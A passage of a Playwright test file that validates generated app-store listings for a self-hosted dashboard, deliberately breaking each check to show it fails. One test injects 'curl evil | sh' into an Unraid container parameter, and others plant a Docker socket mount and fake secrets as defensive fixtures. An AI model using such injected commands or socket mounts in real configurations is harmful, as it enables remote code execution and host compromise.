import { test, expect } from "@playwright/test";
import { cpSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

/**
 * RFC-024 §7 and phase 4: every app-store listing is generated from one
 * metadata file (dist/<app>.yaml), compose.yml and docker.yml, by
 * scripts/stores/build-store-listings.mjs, and committed under dist/.
 *
 * These are the checks that need no network and no store tooling: the
 * committed listings are exactly what the generator writes (the drift
 * check), our own checks pass on them, and each check fails on the mistake
 * it exists for, made on purpose (a description changed in one listing
 * only, a variable dropped, the wrong database image, a secret, a volume
 * in the wrong place, an unpinned image). The stores' own linters run in
 * scripts/stores/validate-upstream.sh; the listings start for real in
 * scripts/rigs/test-store-listings.sh.
 *
 * Imported dynamically, as the other .mjs specs do.
 */
type Files = Record<string, string>;
interface Sources {
  root: string;
  metaFile: string;
  meta: Record<string, any>; // eslint-disable-line @typescript-eslint/no-explicit-any
  compose: Record<string, any>; // eslint-disable-line @typescript-eslint/no-explicit-any
  images: { app: string; postgres: string; updater: string; aio: string };
  channels: { app: { stable: string; next: string }; postgres: { stable: string; next: string }; aio: { stable: string | null; next: string } };
}
interface SourcesModule {
  REPO_ROOT: string;
  loadSources(root?: string): Sources;
  metadataProblems(m: unknown, file?: string): string[];
  profileProblems(meta: unknown, compose: unknown, file?: string): string[];
  isReverseDomain(s: unknown): boolean;
  imageNamesFromWorkflow(text: string, owner: string): { app: string; postgres: string; updater: string; aio: string };
  yaml: { load(s: string): any; dump(v: unknown, o?: object): string }; // eslint-disable-line @typescript-eslint/no-explicit-any
}
interface BuildModule {
  buildListings(src: Sources): Files;
  filesOnDisk(root?: string): Files;
  driftProblems(generated: Files, onDisk: Files): string[];
}
interface ChecksModule { listingProblems(files: Files, src: Sources): string[] }
interface PinModule {
  releaseTags(a: { tag?: string; sha?: string; version?: string; major: string }): { version: string; app_tag: string; postgres_tag: string };
}

const sourcesMod = import("../../scripts/stores/lib/sources.mjs") as unknown as Promise<SourcesModule>;
const buildMod = import("../../scripts/stores/build-store-listings.mjs") as unknown as Promise<BuildModule>;
const checksMod = import("../../scripts/stores/lib/checks.mjs") as unknown as Promise<ChecksModule>;
const pinMod = import("../../scripts/stores/pin-release.mjs") as unknown as Promise<PinModule>;

const REPO = join(__dirname, "..", "..");

async function generated() {
  const { loadSources } = await sourcesMod;
  const { buildListings } = await buildMod;
  const src = loadSources(REPO);
  return { src, files: buildListings(src) };
}

/** A copy of the generator's inputs, to change one of them on purpose. */
function inputsCopy(): string {
  const root = mkdtempSync(join(tmpdir(), "store-listings-"));
  for (const f of ["compose.yml", ".github/workflows/docker.yml", "webapp/package.json", "scripts/stores/upstream.json"]) {
    mkdirSync(dirname(join(root, f)), { recursive: true });
    cpSync(join(REPO, f), join(root, f));
  }
  mkdirSync(join(root, "dist"));
  for (const f of readdirSync(join(REPO, "dist"))) {
    if (f.endsWith(".yaml") && statSync(join(REPO, "dist", f)).isFile()) cpSync(join(REPO, "dist", f), join(root, "dist", f));
  }
  return root;
}

test.describe("the committed listings", () => {
  test("are exactly what the generator writes (the drift check)", async () => {
    const { files } = await generated();
    const { filesOnDisk, driftProblems } = await buildMod;
    expect(driftProblems(files, filesOnDisk(REPO))).toEqual([]);
    // Every store, in its own layout.
    const paths = Object.keys(files);
    const { meta } = (await generated()).src;
    for (const want of [
      `truenas/ix-dev/community/${meta.slug}/app.yaml`,
      `truenas/ix-dev/community/${meta.slug}/questions.yaml`,
      `truenas/ix-dev/community/${meta.slug}/templates/docker-compose.yaml`,
      `truenas/ix-dev/community/${meta.slug}/templates/test_values/basic-values.yaml`,
      `casaos/Apps/${meta.name}/docker-compose.yml`,
      `umbrel/${meta.slug}/umbrel-app.yml`,
      `umbrel/${meta.slug}/docker-compose.yml`,
      "portainer/templates.json",
      "portainer/compose.yml",
      `unraid/templates/${meta.slug}.xml`,
      "unraid/ca_profile.xml",
      "unraid/README.md",
      `unraid/templates/${meta.slug}-updater.xml`,
    ]) expect(paths, want).toContain(want);
  });

  test("pass every one of our checks", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    expect(listingProblems(files, src)).toEqual([]);
  });

  test("the drift check fails on a listing edited by hand, a missing file and a stale one", async () => {
    const { files } = await generated();
    const { driftProblems } = await buildMod;
    const casa = Object.keys(files).find((p) => p.startsWith("casaos/"))!;
    const edited = { ...files, [casa]: files[casa].replace("category: Home", "category: Media") };
    expect(driftProblems(files, edited)).toEqual([`dist/${casa} differs from what the metadata generates`]);
    const missing = { ...files };
    delete missing["portainer/templates.json"];
    expect(driftProblems(files, missing)).toEqual(["dist/portainer/templates.json is missing"]);
    expect(driftProblems(files, { ...files, "umbrel/old-app/umbrel-app.yml": "" })).toEqual([
      "dist/umbrel/old-app/umbrel-app.yml is not generated by anything (stale)",
    ]);
  });
});

test.describe("red: each check fails on the mistake it is for", () => {
  test("a description changed in one listing only", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const casa = `casaos/Apps/${src.meta.name}/docker-compose.yml`;
    const changed = files[casa].replace(src.meta.description.long.de.split("\n")[0], "Ein ganz anderer Text.");
    expect(changed).not.toBe(files[casa]);
    expect(listingProblems({ ...files, [casa]: changed }, src)).toContain("casaos: description.de_DE differs from the metadata");

    const um = `umbrel/${src.meta.slug}/umbrel-app.yml`;
    const umChanged = files[um].replace("tagline: ", "tagline: Not ");
    expect(listingProblems({ ...files, [um]: umChanged }, src)).toContain("umbrel: tagline differs from the metadata");

    const readme = `truenas/ix-dev/community/${src.meta.slug}/README.md`;
    const tnChanged = files[readme].replace(/self-hosted family dashboard/, "photo frame");
    expect(listingProblems({ ...files, [readme]: tnChanged }, src)).toContain("truenas: README.md lacks the metadata's description");
  });

  test("a variable compose.yml sets, dropped from a listing", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const um = `umbrel/${src.meta.slug}/docker-compose.yml`;
    const dropped = files[um].replace(/^\s+FILES_DIR: .*\n/m, "");
    expect(dropped).not.toBe(files[um]);
    expect(listingProblems({ ...files, [um]: dropped }, src)).toContain("umbrel: webapp lacks FILES_DIR, which compose.yml sets");

    const tpl = `truenas/ix-dev/community/${src.meta.slug}/templates/docker-compose.yaml`;
    const tnDropped = files[tpl].replace(/^.*add_env\("PGRST_DB_SCHEMAS".*\n/m, "");
    expect(tnDropped).not.toBe(files[tpl]);
    expect(listingProblems({ ...files, [tpl]: tnDropped }, src)).toContain("truenas: rest lacks PGRST_DB_SCHEMAS, which compose.yml sets");

    const pt = "portainer/compose.yml";
    const ptDropped = files[pt].replace(/^\s+KINBOARD_SCHEDULER: .*\n/m, "");
    expect(listingProblems({ ...files, [pt]: ptDropped }, src).join("\n")).toContain("portainer: webapp lacks KINBOARD_SCHEDULER");
  });

  test("the wrong database image: supabase/postgres, a plain postgres, TrueNAS's helper", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const casa = `casaos/Apps/${src.meta.name}/docker-compose.yml`;
    const pgRef = new RegExp(`${src.images.postgres}:[^\\s]+`);
    for (const wrong of ["postgres:17-alpine", "supabase/postgres:15.14.1.159"]) {
      const swapped = files[casa].replace(pgRef, wrong);
      expect(listingProblems({ ...files, [casa]: swapped }, src).join("\n")).toContain(
        `casaos: the database runs ${wrong.split(":")[0]}, not the stock PostgreSQL image with safeupdate`,
      );
    }
    const values = `truenas/ix-dev/community/${src.meta.slug}/ix_values.yaml`;
    const tnSwapped = files[values].replace(`repository: ${src.images.postgres}`, "repository: postgres");
    expect(listingProblems({ ...files, [values]: tnSwapped }, src).join("\n")).toContain("truenas: the database runs postgres,");
    const tpl = `truenas/ix-dev/community/${src.meta.slug}/templates/docker-compose.yaml`;
    const helper = `${files[tpl]}{% set pg = tpl.deps.postgres("postgres", "postgres_17_image", {}, perms) %}\n`;
    expect(listingProblems({ ...files, [tpl]: helper }, src)).toContain(
      "truenas: the template uses tpl.deps.postgres, whose stock postgres image can't load safeupdate",
    );
    const pt = "portainer/compose.yml";
    const ptSwapped = files[pt].replace(/\$\{[A-Z_]*POSTGRES_IMAGE:-[^}]+\}/, "${X:-supabase/postgres}");
    expect(listingProblems({ ...files, [pt]: ptSwapped }, src).join("\n")).toContain("portainer: the database runs supabase/postgres");
  });

  test("the app's image under another name than docker.yml's", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const um = `umbrel/${src.meta.slug}/docker-compose.yml`;
    const renamed = files[um].replaceAll(`${src.images.app}:`, "ghcr.io/someone-else/app:");
    expect(listingProblems({ ...files, [um]: renamed }, src).join("\n")).toContain(`not docker.yml's ${src.images.app}`);
  });

  test("an image without its digest, or with another digest than the release's", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const casa = `casaos/Apps/${src.meta.name}/docker-compose.yml`;
    const unpinned = files[casa].replace(/(postgrest\/postgrest:[^@\s]+)@sha256:[0-9a-f]{64}/, "$1");
    expect(listingProblems({ ...files, [casa]: unpinned }, src).join("\n")).toMatch(/casaos: rest's image postgrest\/postgrest:\S+ is not pinned by digest/);
    const other = files[casa].replace(/(postgrest\/postgrest:[^@\s]+@sha256:)[0-9a-f]{64}/, `$1${"0".repeat(64)}`);
    expect(listingProblems({ ...files, [casa]: other }, src).join("\n")).toContain("casaos: rest runs postgrest/postgrest");
  });

  test("a secret written into a listing", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const casa = `casaos/Apps/${src.meta.name}/docker-compose.yml`;
    const withSecret = files[casa].replace("      FILES_DIR:", "      JWT_SECRET: correct-horse-battery-staple\n      FILES_DIR:");
    expect(listingProblems({ ...files, [casa]: withSecret }, src)).toContain(
      "casaos: webapp.JWT_SECRET carries a value; secrets come from the init step, never the listing",
    );
    const hex = files[casa].replace("      FILES_DIR:", `      SOMETHING: ${"ab12".repeat(10)}\n      FILES_DIR:`);
    expect(listingProblems({ ...files, [casa]: hex }, src)).toContain(`${casa}: carries a long hex string (a secret?)`);
    const jwt = files["portainer/templates.json"].replace('"note": "', '"note": "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic2VydmljZV9yb2xlIn0.abc ');
    expect(listingProblems({ ...files, "portainer/templates.json": jwt }, src)).toContain("portainer/templates.json: carries a JWT");
  });

  test("a volume where its store doesn't keep data, a mount gone, the socket", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const slug = src.meta.slug;
    const um = `umbrel/${slug}/docker-compose.yml`;
    const moved = files[um].replace("${APP_DATA_DIR}/data/storage:", "/srv/photos:");
    const p1 = listingProblems({ ...files, [um]: moved }, src).join("\n");
    expect(p1).toContain("umbrel: webapp mounts /srv/photos at /var/lib/storage, not ${APP_DATA_DIR}/data/storage");
    const noKeep = { ...files };
    delete noKeep[`umbrel/${slug}/data/db/.gitkeep`];
    expect(listingProblems(noKeep, src)).toContain("umbrel: data/db/ is not committed (.gitkeep)");
    const casa = `casaos/Apps/${src.meta.name}/docker-compose.yml`;
    const noDb = files[casa].replace(/(\n\s+- type: bind\n\s+source: \/DATA\/AppData\/[^/]+\/db\n\s+target: \/var\/lib\/postgresql\/data)/, "");
    expect(noDb).not.toBe(files[casa]);
    expect(listingProblems({ ...files, [casa]: noDb }, src)).toContain("casaos: db does not mount db at /var/lib/postgresql/data");
    const sock = files[casa].replace(
      "        target: /var/lib/storage\n",
      "        target: /var/lib/storage\n      - type: bind\n        source: /var/run/docker.sock\n        target: /var/run/docker.sock\n",
    );
    expect(listingProblems({ ...files, [casa]: sock }, src).join("\n")).toContain("casaos: webapp mounts the Docker socket");
  });

  test("Umbrel: a bare service name where the shared network needs the container's", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const um = `umbrel/${src.meta.slug}/docker-compose.yml`;
    const bare = files[um].replace(`http://${src.meta.slug}_rest_1:3000`, "http://rest:3000");
    expect(listingProblems({ ...files, [um]: bare }, src).join("\n")).toContain(
      `umbrel: webapp.POSTGREST_URL is "http://rest:3000", compose.yml resolves it to "http://${src.meta.slug}_rest_1:3000"`,
    );
    const noHost = files[um].replace(/^(\s+)POSTGRES_HOST: \S+_db_1\n(?=\s+volumes:\n\s+- \$\{APP_DATA_DIR\}\/data\/config:\/kinboard\n\s+- )/m, "");
    expect(noHost).not.toBe(files[um]);
    expect(listingProblems({ ...files, [um]: noHost }, src).join("\n")).toMatch(/umbrel: init must reach the database as \S+_db_1/);
  });
});

/**
 * RFC-024 §4.7: automatic updates on every install shape. The stores with an
 * update path of their own (TrueNAS, CasaOS, Umbrel) never get the
 * Docker-socket updater; Portainer's template keeps it, under compose.yml's
 * `autoupdate` profile, behind a template switch that is off by default.
 */
type Svc = { profiles?: string[]; volumes?: unknown[]; image?: string };
/** The services Compose starts for a stack file with COMPOSE_PROFILES=<active>. */
function startedWith(text: string, yamlLoad: (s: string) => unknown, active: string): Record<string, Svc> {
  const doc = yamlLoad(text) as { services: Record<string, Svc> };
  const on = active.split(",").filter(Boolean);
  return Object.fromEntries(Object.entries(doc.services).filter(([, s]) => !s.profiles?.length || s.profiles.some((p) => on.includes(p))));
}
const socketMounts = (services: Record<string, Svc>) =>
  Object.entries(services).filter(([, s]) => (s.volumes ?? []).some((v) => JSON.stringify(v).includes("docker.sock"))).map(([n]) => n);

test.describe("automatic updates: the updater only in Portainer, the socket only when switched on", () => {
  test("Portainer keeps the updater under its profile, Unraid as a template of its own; TrueNAS, CasaOS and Umbrel leave it out", async () => {
    const { src, files } = await generated();
    const { yaml } = await sourcesMod;
    const stack = files["portainer/compose.yml"];
    const all = (yaml.load(stack) as { services: Record<string, Svc> }).services;
    expect(all.updater?.profiles).toEqual(["autoupdate"]);
    expect(all.updater?.image).toBe(`\${KINBOARD_UPDATER_IMAGE:-${src.images.updater}}:\${KINBOARD_TAG:-latest}`);
    // Off: no updater, no socket anywhere. On: the updater, and only it, has it.
    expect(Object.keys(startedWith(stack, yaml.load, ""))).not.toContain("updater");
    expect(socketMounts(startedWith(stack, yaml.load, ""))).toEqual([]);
    expect(Object.keys(startedWith(stack, yaml.load, "autoupdate"))).toContain("updater");
    expect(socketMounts(startedWith(stack, yaml.load, "autoupdate"))).toEqual(["updater"]);
    // Unraid's second template is the updater beside the all-in-one container (RFC-024 §4.7): its own, never the first's.
    const unraidUpdater = `unraid/templates/${src.meta.slug}-updater.xml`;
    expect(files[unraidUpdater]).toContain(src.images.updater);
    for (const [path, text] of Object.entries(files)) {
      if (path.startsWith("portainer/") || path === unraidUpdater) continue;
      expect(text, path).not.toMatch(/docker\.sock/);
      expect(text, path).not.toContain(src.images.updater);
      expect(text, path).not.toMatch(/^\s+updater:/m);
    }
  });

  test("each template's switch is COMPOSE_PROFILES, off by default, with the metadata's texts", async () => {
    const { src, files } = await generated();
    const t = JSON.parse(files["portainer/templates.json"]);
    // The two stack templates; the third is the all-in-one image's single container, with no profiles.
    const stacks = t.templates.filter((x: { type: number }) => x.type === 3);
    expect(stacks).toHaveLength(2);
    expect(t.templates.filter((x: { type: number }) => x.type === 1)).toHaveLength(1);
    for (const tpl of stacks) {
      const f = tpl.env.find((e: { name: string }) => e.name === "COMPOSE_PROFILES");
      expect(f, `template ${tpl.id}`).toEqual({
        name: "COMPOSE_PROFILES",
        label: src.meta.opt_in.autoupdate.label,
        description: src.meta.opt_in.autoupdate.description,
        select: [
          { text: src.meta.opt_in.autoupdate.off, value: "", default: true },
          { text: src.meta.opt_in.autoupdate.on, value: "autoupdate" },
        ],
      });
    }
    // Every store's reason for leaving it out is written down.
    for (const store of ["truenas", "casaos", "umbrel"]) expect(src.meta.omit_services.updater[store], store).toBeTruthy();
    expect(src.meta.omit_services.updater.portainer).toBeUndefined();
  });

  test("red: the profile dropped from Portainer's updater, so the socket would be on for every install", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const pt = "portainer/compose.yml";
    const noProfile = files[pt].replace(/^ {4}profiles:\n {6}- autoupdate\n/m, "");
    expect(noProfile).not.toBe(files[pt]);
    const p = listingProblems({ ...files, [pt]: noProfile }, src);
    expect(p).toContain('portainer: updater has the profiles [], compose.yml ["autoupdate"]: it would start without being switched on');
    expect(p).toContain("portainer: updater mounts the Docker socket");
  });

  test("red: the socket in another Portainer service, or the updater in another store", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const pt = "portainer/compose.yml";
    const webSock = files[pt].replace(
      "      - ${KINBOARD_STORAGE_DIR:-kinboard-storage}:/var/lib/storage\n",
      "      - ${KINBOARD_STORAGE_DIR:-kinboard-storage}:/var/lib/storage\n      - /var/run/docker.sock:/var/run/docker.sock\n",
    );
    expect(webSock).not.toBe(files[pt]);
    expect(listingProblems({ ...files, [pt]: webSock }, src)).toContain("portainer: webapp mounts the Docker socket");

    const casa = `casaos/Apps/${src.meta.name}/docker-compose.yml`;
    const updater = (yaml_: string) => yaml_.replace(/\nnetworks:\n/, `\n  updater:\n    image: ${src.images.updater}:latest\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\nnetworks:\n`);
    expect(updater(files[casa])).not.toBe(files[casa]);
    expect(listingProblems({ ...files, [casa]: updater(files[casa]) }, src)).toContain(
      `casaos: service updater is left out of this store (${src.meta.omit_services.updater.casaos})`,
    );
  });

  test("red: Portainer's updater on another image than docker.yml's", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const pt = "portainer/compose.yml";
    const other = files[pt].replace(`:-${src.images.updater}}`, ":-ghcr.io/someone-else/updater}");
    expect(other).not.toBe(files[pt]);
    expect(listingProblems({ ...files, [pt]: other }, src)).toContain(
      `portainer: updater runs ghcr.io/someone-else/updater, not docker.yml's ${src.images.updater}`,
    );
  });

  test("red: the switch missing, on by default, or for another profile", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const tj = "portainer/templates.json";
    const edit = (f: (env: Array<Record<string, any>>) => void) => {
      const t = JSON.parse(files[tj]);
      f(t.templates[0].env);
      return { ...files, [tj]: `${JSON.stringify(t, null, 2)}\n` };
    };
    const field = (env: Array<Record<string, any>>) => env.find((e) => e.name === "COMPOSE_PROFILES")!;
    expect(listingProblems(edit((env) => env.splice(env.indexOf(field(env)), 1)), src)).toContain(
      "portainer: template 1 has no switch for autoupdate (COMPOSE_PROFILES)",
    );
    expect(listingProblems(edit((env) => { const f = field(env); f.select[0].default = false; f.select[1].default = true; }), src)).toContain(
      "portainer: template 1's COMPOSE_PROFILES is not off by default",
    );
    expect(listingProblems(edit((env) => { field(env).default = "autoupdate"; }), src)).toContain(
      "portainer: template 1's COMPOSE_PROFILES is not off by default",
    );
    const other = listingProblems(edit((env) => { field(env).select[1].value = "everything"; }), src);
    expect(other).toContain("portainer: template 1's COMPOSE_PROFILES can't switch on autoupdate");
    expect(other).toContain("portainer: template 1's COMPOSE_PROFILES offers everything, no profile of the stack");
    expect(listingProblems(edit((env) => { field(env).label = "Updates"; }), src)).toContain(
      "portainer: template 1's COMPOSE_PROFILES label or description differs from the metadata",
    );
  });

  test("red: the metadata must settle a profiled service for every store, and only Portainer can offer one", async () => {
    const { profileProblems, yaml } = await sourcesMod;
    const { src } = await generated();
    expect(profileProblems(src.meta, src.compose)).toEqual([]);
    const meta = () => yaml.load(yaml.dump(src.meta));
    const both = meta();
    both.omit_services.updater.portainer = "no";
    expect(profileProblems(both, src.compose)).toEqual(["metadata: compose.yml's updater is both left out of portainer and offered there (opt_in.autoupdate)"]);
    const neither = meta();
    delete neither.omit_services.updater.umbrel;
    expect(profileProblems(neither, src.compose)).toEqual([
      "metadata: compose.yml's updater starts only with the profile autoupdate; leave it out of umbrel (omit_services.updater.umbrel) or offer the profile there (opt_in)",
    ]);
    const casa = meta();
    delete casa.omit_services.updater.casaos;
    casa.opt_in.autoupdate.stores.push("casaos");
    expect(profileProblems(casa, src.compose)).toEqual(["metadata: opt_in.autoupdate: only the Portainer listing can offer a profile, not casaos"]);
    const unknown = meta();
    unknown.opt_in.everything = unknown.opt_in.autoupdate;
    expect(profileProblems(unknown, src.compose)).toEqual(["metadata: opt_in.everything is no profile of any compose.yml service"]);
  });

  test("red: compose.yml's updater without its profile is refused, so no listing hands out the socket by default", async () => {
    const root = inputsCopy();
    try {
      const { loadSources } = await sourcesMod;
      const { buildListings } = await buildMod;
      const { listingProblems } = await checksMod;
      const compose = join(root, "compose.yml");
      const text = readFileSync(compose, "utf8");
      const changed = text.replace(/^ {4}profiles: \["autoupdate"\]\n/m, "");
      expect(changed).not.toBe(text);
      writeFileSync(compose, changed);
      // The switch would switch nothing: refused at once.
      expect(() => loadSources(root)).toThrow(/opt_in\.autoupdate is no profile of any compose\.yml service/);
      // And without the switch too: the socket in a service that is always on.
      const metaFile = join(root, "dist", readdirSync(join(root, "dist")).find((f) => f.endsWith(".yaml"))!);
      writeFileSync(metaFile, readFileSync(metaFile, "utf8").replace(/^opt_in:\n(?: {2}.*\n|\n(?= ))+/m, ""));
      const src = loadSources(root);
      expect(src.meta.opt_in).toBeUndefined();
      expect(() => listingProblems(buildListings(src), src)).toThrow(/updater mounts the Docker socket without a profile/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("the updater's image comes from docker.yml: renamed there, Portainer's stack follows", async () => {
    const root = inputsCopy();
    try {
      const { loadSources } = await sourcesMod;
      const { buildListings } = await buildMod;
      const wf = join(root, ".github/workflows/docker.yml");
      const text = readFileSync(wf, "utf8");
      const changed = text.replace(/^(\s+UPDATER_IMAGE_NAME: \$\{\{ github\.repository_owner \}\})\/[a-z-]+$/m, "$1/updater-renamed");
      expect(changed).not.toBe(text);
      writeFileSync(wf, changed);
      const files = buildListings(loadSources(root));
      expect(files["portainer/compose.yml"]).toMatch(/image: \$\{KINBOARD_UPDATER_IMAGE:-ghcr\.io\/[^/]+\/updater-renamed\}:/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});

test.describe("one source", () => {
  test("the product's name appears in the metadata and nowhere in the generator", async () => {
    const { src } = await generated();
    const name = new RegExp(src.meta.name, "i");
    const dir = join(REPO, "scripts", "stores");
    const walk = (d: string): string[] =>
      readdirSync(d).flatMap((f) => (statSync(join(d, f)).isDirectory() ? walk(join(d, f)) : [join(d, f)]));
    const offenders = walk(dir)
      .filter((f) => /\.(mjs|sh|json)$/.test(f))
      .filter((f) => name.test(readFileSync(f, "utf8")))
      .map((f) => f.slice(REPO.length + 1));
    expect(offenders).toEqual([]);
  });

  test("the image names come from docker.yml: renamed there, the listings follow", async () => {
    const root = inputsCopy();
    try {
      const { loadSources } = await sourcesMod;
      const { buildListings } = await buildMod;
      const wf = join(root, ".github/workflows/docker.yml");
      writeFileSync(wf, readFileSync(wf, "utf8").replace(/^(\s+POSTGRES_IMAGE_NAME: \$\{\{ github\.repository_owner \}\})\/[a-z-]+$/m, "$1/db-renamed"));
      const src = loadSources(root);
      expect(src.images.postgres).toMatch(/\/db-renamed$/);
      // The release block pins the old name's digest, so a pinned listing refuses.
      expect(() => buildListings(src)).toThrow(/release\.digests has no digest for .*db-renamed/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("the services come from compose.yml: a variable added there reaches every listing", async () => {
    const root = inputsCopy();
    try {
      const { loadSources } = await sourcesMod;
      const { buildListings } = await buildMod;
      const { listingProblems } = await checksMod;
      const compose = join(root, "compose.yml");
      writeFileSync(compose, readFileSync(compose, "utf8").replace("      FILES_DIR: /var/lib/storage/files\n", "      FILES_DIR: /var/lib/storage/files\n      NEW_SETTING: \"on\"\n"));
      const src = loadSources(root);
      const files = buildListings(src);
      expect(listingProblems(files, src)).toEqual([]);
      for (const [path, text] of Object.entries(files)) {
        if (/(docker-compose\.ya?ml|portainer\/compose\.yml)$/.test(path)) expect(text, path).toContain("NEW_SETTING");
      }
      // The committed listings now lag behind: the drift check says so.
      const { driftProblems, filesOnDisk } = await buildMod;
      expect(driftProblems(files, filesOnDisk(REPO)).length).toBeGreaterThanOrEqual(4);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("the metadata is checked: both languages, no email, the license as package.json has it", async () => {
    const { metadataProblems, yaml, loadSources } = await sourcesMod;
    const { src } = await generated();
    expect(metadataProblems(src.meta)).toEqual([]);
    const meta = yaml.load(yaml.dump(src.meta));
    delete meta.description.long.de;
    meta.maintainer.contact = "someone@example.org";
    expect(metadataProblems(meta)).toEqual([
      "metadata: description.long.de is required",
      "metadata: maintainer must not carry an email address",
    ]);
    const root = inputsCopy();
    try {
      const metaFile = join(root, src.metaFile);
      writeFileSync(metaFile, readFileSync(metaFile, "utf8").replace(/^license: .*$/m, "license: MIT"));
      expect(() => loadSources(root)).toThrow(/license MIT differs from webapp\/package\.json's/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test("the reverse-domain id check is linear: a long 0.0.0… input answers at once", async () => {
    const { isReverseDomain } = await sourcesMod;
    for (const ok of ["app.kinboard", "com.example.myapp", "a_b.c-d", "x.y.z.1", "0.0"]) expect(isReverseDomain(ok), ok).toBe(true);
    for (const bad of ["kinboard", "a..b", ".a", "a.", "A.b", "a.b_", "a-b", "a._b", "", null]) expect(isReverseDomain(bad), String(bad)).toBe(false);
    for (const evil of [`0.0${".0".repeat(50_000)}!`, `0${".0".repeat(50_000)}.`, `a${"_a".repeat(50_000)}.-`]) {
      const t = Date.now();
      expect(isReverseDomain(evil)).toBe(false);
      expect(Date.now() - t).toBeLessThan(200);
    }
  });

  test("every image a pinned listing runs has the release's digest, amd64 and arm64 checked when pinned", async () => {
    const { src, files } = await generated();
    const refs = new Set<string>();
    for (const [path, text] of Object.entries(files)) {
      if (path.startsWith("portainer/")) continue;
      for (const m of text.matchAll(/image: (\S+@sha256:[0-9a-f]{64})/g)) refs.add(m[1]);
    }
    expect(refs.size).toBeGreaterThanOrEqual(4);
    for (const ref of refs) {
      const [name, digest] = ref.split("@");
      expect(src.meta.release.digests[name], ref).toBe(digest);
    }
  });

  test("the release's compose.yml names the product as the metadata does", async () => {
    const { src } = await generated();
    const mod = (await import("../../scripts/release-compose.mjs")) as unknown as {
      productName(root?: string): string;
      releaseCompose(text: string, r: { tag: string; image: string; name?: string }): { text: string };
    };
    expect(mod.productName(REPO)).toBe(src.meta.name);
    const compose = readFileSync(join(REPO, "compose.yml"), "utf8");
    const asset = mod.releaseCompose(compose, { tag: "v1.18.0", image: src.images.app });
    expect(asset.text.split("\n")[0]).toContain(`# compose.yml from ${src.meta.name} v1.18.0,`);
    const renamed = mod.releaseCompose(compose, { tag: "v1.18.0", image: src.images.app, name: "Renamed" });
    expect(renamed.text.split("\n")[0]).toContain("# compose.yml from Renamed v1.18.0,");
  });

  test("pin-release: a release tag and a build of main pin docker.yml's tags", async () => {
    const { releaseTags } = await pinMod;
    expect(releaseTags({ tag: "v1.18.0", major: "17" })).toEqual({ version: "1.18.0", app_tag: "1.18.0", postgres_tag: "17-1.18.0" });
    expect(releaseTags({ tag: "v1.18.0-rc.2", major: "17" })).toEqual({ version: "1.18.0-rc.2", app_tag: "1.18.0-rc.2", postgres_tag: "17-1.18.0-rc.2" });
    expect(releaseTags({ sha: "2e83c9f", version: "1.18.0-main.2e83c9f", major: "17" })).toEqual({
      version: "1.18.0-main.2e83c9f", app_tag: "sha-2e83c9f", postgres_tag: "17-sha-2e83c9f",
    });
    expect(() => releaseTags({ tag: "1.18.0", major: "17" })).toThrow(/not a release tag/);
    expect(() => releaseTags({ sha: "2e83c9f", major: "17" })).toThrow(/needs --version/);
  });
});

test.describe("the Unraid template for the all-in-one image (RFC-024 §5.1, phase 5)", () => {
  const tpl = (slug: string) => `unraid/templates/${slug}.xml`;

  test("CA's format: <Container version=\"2\">, the image on docker.yml's channel, Beta while there is no stable one", async () => {
    const { src, files } = await generated();
    const xml = files[tpl(src.meta.slug)];
    expect(xml.startsWith('<?xml version="1.0"?>')).toBe(true);
    expect(xml).toContain('<Container version="2">');
    const tag = src.channels.aio.stable ?? src.channels.aio.next;
    expect(xml).toContain(`<Repository>${src.images.aio}:${tag}</Repository>`);
    expect(src.channels.aio.stable, "no stable all-in-one channel before phase 5's gates").toBeNull();
    expect(xml).toContain("<Beta>true</Beta>");
    expect(xml).toContain(`<WebUI>http://[IP]:[PORT:${src.meta.ports.web.container}]/</WebUI>`);
    expect(xml).toMatch(/<ExtraParams>--stop-timeout=60<\/ExtraParams>/);
    expect(xml).toMatch(/<Config [^>]*Target="\/data" Default="\/mnt\/user\/appdata\/[a-z-]+" Mode="rw"[^>]*Type="Path"/);
    expect(xml).toMatch(/<Config [^>]*Target="PUID" Default="99"/);
    expect(xml).toMatch(/<Config [^>]*Target="PGID" Default="100"/);
    expect(xml).not.toContain("WEBRTC_LAN_IP");
    expect(files["unraid/ca_profile.xml"]).toMatch(/<CommunityApplications>\s*\n\s*<Profile>[^<]+<\/Profile>/);
  });

  test("red: each of CA's rules the checks hold, broken on purpose", async () => {
    const { src, files } = await generated();
    const { listingProblems } = await checksMod;
    const path = tpl(src.meta.slug);
    const with_ = (from: string | RegExp, to: string) => {
      const changed = files[path].replace(from, to);
      expect(changed, String(from)).not.toBe(files[path]);
      return listingProblems({ ...files, [path]: changed }, src);
    };
    expect(with_("</Container>", "</Contain>").join()).toContain("not well-formed XML");
    expect(with_("  <Beta>true</Beta>\n", "")).toContain("unraid: no stable all-in-one channel yet, so <Beta>true</Beta> is required");
    expect(with_(/\[PORT:\d+\]/, "[PORT:3001]").join()).toContain("WebUI must be http://[IP]:[PORT:3000]");
    expect(with_("--stop-timeout=60", "--stop-timeout=10").join()).toContain("ExtraParams must set --stop-timeout");
    expect(with_("--stop-timeout=60", "--stop-timeout=60; curl evil | sh").join()).toContain("shell character");
